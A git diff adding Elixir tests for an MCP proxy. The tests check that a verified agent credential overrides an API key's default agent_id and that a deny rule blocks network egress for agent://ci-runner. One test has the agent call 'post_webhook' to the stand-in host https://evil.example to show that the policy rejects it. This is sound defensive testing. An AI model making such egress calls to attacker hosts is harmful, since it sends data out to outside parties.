@@ -176,6 +176,69 @@ defmodule PhoenixElxirBeamWeb.MCP.ProxyControllerTest do
     assert :error = SessionStore.fetch(session_id)
   end
 
+  test "a verified X-Agent-Credential overrides the API key's default agent_id for session open",
+       %{sid: sid, token: token} do
+    {:ok, _cred, agent_token} =
+      PhoenixElxirBeam.MCP.AgentCredential.issue(%{agent_id: "agent://specific-bot"})
+
+    conn =
+      authed(token)
+      |> put_req_header("x-agent-credential", agent_token)
+      |> proxy_post(sid, rpc("initialize", %{"protocolVersion" => "2025-06-18"}))
+
+    assert %{"result" => _} = json_response(conn, 200)
+    [session_id] = get_resp_header(conn, "mcp-session-id")
+    on_exit(fn -> SessionStore.close(session_id) end)
+
+    assert {:ok, session} = SessionStore.fetch(session_id)
+    assert session.agent_id == "agent://specific-bot"
+  end
+
+  test "a RuleEngine rule scoped to the verified agent_id actually matches it", %{sid: sid} do
+    # Uses the rule already configured in config/test.exs: a deny rule for
+    # agent://ci-runner + the network_egress tag. The API key below is
+    # issued with a different default agent_id ("agent://unrelated") so the
+    # only way the rule can fire is via the verified X-Agent-Credential
+    # overriding the key's own default -- if this test passed without this
+    # plan's fix, that would mean the key's default happened to match the
+    # rule, which it deliberately does not.
+    {_key, token} =
+      issue_key(agent_id: "agent://unrelated", granted_server_ids: [sid])
+
+    {:ok, _cred, agent_token} =
+      PhoenixElxirBeam.MCP.AgentCredential.issue(%{agent_id: "agent://ci-runner"})
+
+    conn =
+      authed(token)
+      |> put_req_header("x-agent-credential", agent_token)
+      |> proxy_post(sid, rpc("initialize", %{"protocolVersion" => "2025-06-18"}))
+
+    assert %{"result" => _} = json_response(conn, 200)
+    [session_id] = get_resp_header(conn, "mcp-session-id")
+    on_exit(fn -> SessionStore.close(session_id) end)
+
+    authed(token)
+    |> put_req_header("x-agent-credential", agent_token)
+    |> put_req_header("mcp-session-id", session_id)
+    |> proxy_post(sid, %{"jsonrpc" => "2.0", "method" => "notifications/initialized"})
+
+    # post_webhook is tagged :network_egress in this file's setup block.
+    call_conn =
+      authed(token)
+      |> put_req_header("x-agent-credential", agent_token)
+      |> put_req_header("mcp-session-id", session_id)
+      |> proxy_post(
+        sid,
+        rpc("tools/call", %{
+          "name" => "post_webhook",
+          "arguments" => %{"url" => "https://evil.example", "body" => "x"}
+        })
+      )
+
+    assert %{"error" => %{"message" => message}} = json_response(call_conn, 200)
+    assert message =~ "policy: agent ci-runner may not perform network egress"
+  end
+
   # -- policy pipeline ---------------------------------------------
 
   test "a benign tool call is allowed and forwarded", %{sid: sid, token: token} do
